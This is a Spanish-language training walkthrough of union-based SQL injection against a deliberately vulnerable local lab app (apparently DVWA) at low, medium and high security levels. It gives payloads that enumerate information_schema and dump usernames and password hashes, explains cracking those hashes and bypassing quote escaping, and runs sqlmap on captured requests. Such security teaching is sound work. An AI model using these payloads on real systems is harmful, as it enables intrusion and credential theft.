# SQLi Union

## Bajo

Una de las primeras pruebas para detectar si una página es vulnerable a Inyección SQL (SQLi) es el ataque conocido como "Codo comillas" o "Croqueta -1". Consiste en introducir una comilla simple en los parámetros de la URL. Por ejemplo, en:

```bash
http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#
```

Si observamos dicha URL, vemos que tiene el parámetro `id`. Al añadir una comilla al parámetro `id`, la URL se transforma en:

```bash
http://localhost/vulnerabilities/sqli/?id=1'&Submit=Submit#
```

Este cambio puede producir un error de sintaxis en la base de datos, indicando una posible vulnerabilidad. Originalmente, la consulta SQL sería:

<div style={{textAlign: 'center'}}>
    ![Error de sintaxis](/img/attacks/SQLi/Union/attack-basic-message-error.png)
</div>

La consulta original sería:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id'
```

Pero con la inyección, se transforma en:

```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id''
```

Ahora que se ha detectado una posible vulnerabilidad, se puede intentar explotarla.

Lo primero que se puede probar es recuperar todos los datos que pueda devolver la sentencia, introduciendo la siguiente inyección:

```sql
1' or 0=0#
```

Esto cierra la comilla en el valor de id y añade una condición siempre verdadera (0=0), retornando todos los registros de la tabla. La almohadilla (#) comenta el resto de la sentencia SQL para evitar errores adicionales.

A continuación, es útil identificar la cantidad de campos que devuelve la sentencia SQL, incrementando el número en la cláusula `order by` hasta que se produzca un error:

```sql
1' order by 1#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-number-columns.png)
</div>

Si el error ocurre con `order by 3#`, significa que la consulta tiene 2 columnas.

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-number-column-max.png)
</div>

Conociendo el número de columnas, se puede comprobar dónde se imprime cada columna:

```sql
1' union select all 1,2#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-show-paint-column.png)
</div>

Si el "1" se muestra en el nombre y el "2" en el apellido, se identifican las posiciones de las columnas.

A continuación, se puede extraer información relevante, como la versión de MySQL:

```sql
1' union select all version(),2#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-mysql-version.png)
</div>

También se puede obtener el usuario de la base de datos:

```sql
1' union select all user(),2#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-show-users-database.png)
</div>

Y el nombre de la base de datos actual:

```sql
1' union select all database(),2#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-show-databases.png)
</div>

Para continuar, es útil conocer las tablas y columnas disponibles. Esta información se encuentra en la tabla `information_schema` desde la versión 5.0.2 de MySQL.

Para obtener todas las tablas de la base de datos:

```sql
1' union select null, table_name from information_schema.tables#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-show-tables-information-schema.png)
</div>

Para acotar la búsqueda a una base de datos específica:

```sql
1' union select null, table_name from information_schema.tables WHERE table_schema='dvwa'#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-show-tables-database.png)
</div>

Para obtener las columnas de la tabla `users`:

```sql
1' union select null, column_name from information_schema.columns WHERE table_name='users'#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-show-columns-user-tables.png)
</div>

Finalmente, para extraer los datos de la tabla `users`:

```sql
1' union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users#
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-basic-show-data-tables-users.png)
</div>

Una vez obtenidos los usuarios y los hashes, se puede identificar el hash correspondiente y proceder a su descifrado. Por ejemplo, si se detecta que es un hash MD5, se puede utilizar una herramienta como HashKiller para obtener la contraseña original.

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/crack-md5-password.png)
</div>

## Medio

Cuando se utiliza un elemento select en lugar de un input, modificar directamente el valor con el inspector de elementos del navegador puede ser menos práctico. En estos casos, es útil emplear herramientas como OWASP ZAP para interceptar y manipular las peticiones.

Al realizar la primera petición, en OWASP ZAP se pueden observar los parámetros enviados por POST, como `id` y `Submit`. Como en el ejercicio anterior, el parámetro de interés es `id`.

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-medium-intercept.png)
</div>

Se puede probar el ataque de "Codo comilla", modificando la petición:

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-medium-modify-request-fail.png)
</div>

En este caso, el error obtenido es diferente y se observa una barra de escape (`\`) delante de la comilla. Esto se debe a que el código utiliza la función [mysqli_real_escape_string()](https://www.php.net/manual/es/mysqli.real-escape-string.php), que escapa los caracteres especiales para su uso en una sentencia SQL.

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-medium-message-error.png)
</div>

Por lo tanto, el ataque con comillas no funcionará. Se puede intentar el ataque de SQLi sin comillas:

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-medium-modify-request.png)
</div>

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-medium-result.png)
</div>

Como se observa, el ataque funciona. A partir de aquí, se pueden repetir los ataques del nivel anterior, omitiendo las comillas para evitar la función de escape.

Para facilitar el proceso, se puede utilizar la herramienta [SQLMap](https://sqlmap.org/).

Se realiza la petición y se guarda con OWASP ZAP (clic secundario -> Save as Raw -> Request -> All).

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/owasp-zap-menu-save-request.png)
</div>

El archivo guardado puede utilizarse con SQLMap:

```bash
sqlmap -r sqlmap-medium.raw
```

Siguiendo las opciones de SQLMap, se pueden identificar diferentes tipos de inyecciones.

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-medium-sqlmap.png)
</div>

## Alto

En el nivel alto, el input se abre en una nueva página y el resultado en otra. Al realizar el ataque de "Codo comilla", se genera un error menos informativo. Se pueden probar las combinaciones anteriores y, si no funcionan, consultar técnicas adicionales en [OWASP](https://www.owasp.org/index.php/Testing_for_SQL_Injection_\(OTG-INPVAL-005\)).

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/form-high.png)
</div>

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-high-fail.png)
</div>

El procedimiento es similar al del primer nivel, por lo que no se repiten todos los comandos. En su lugar, se muestra cómo realizar el ataque y recuperar la información con SQLMap.

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-high.png)
</div>

Se captura la información con OWASP ZAP y se guarda en un archivo. Luego, se utiliza SQLMap con el parámetro `--second-url` para definir dónde buscar la información de retorno:

```bash
sqlmap -r high.raw --second-url="http://localhost/vulnerabilities/sqli/"
```

<div style={{textAlign: 'center'}}>
    ![Numero de columnas](/img/attacks/SQLi/Union/attack-high-sqlmap.png)
</div>

En resumen, para identificar y explotar vulnerabilidades de inyección SQL en diferentes niveles de seguridad, es importante conocer las técnicas básicas de inyección SQL y el uso de herramientas como OWASP ZAP y SQLMap. Estas herramientas permiten realizar pruebas más avanzadas y adaptarse a distintos escenarios de seguridad. Se recomienda utilizar estas habilidades de manera responsable y únicamente en entornos controlados o con autorización explícita.
